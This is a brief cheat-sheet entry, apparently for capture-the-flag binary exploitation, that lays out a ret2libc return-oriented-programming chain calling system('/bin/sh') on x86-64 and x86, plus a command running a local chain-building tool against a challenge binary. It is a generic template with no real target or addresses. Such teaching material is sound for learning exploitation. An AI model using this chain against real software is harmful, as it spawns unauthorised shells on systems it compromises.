# The system chain — the full recipe


system("/bin/sh") — the dynamic-binary ending:

    pop rdi ; binsh_addr
    ret                     # alignment
    system_addr             # leaked libc + offset

## Via the tool

    python3 tools/rop_chain.py ./chal ret2func --func <system> --arg <binsh>

## x86 version

    [system][exit][binsh]   # stack args, no pops
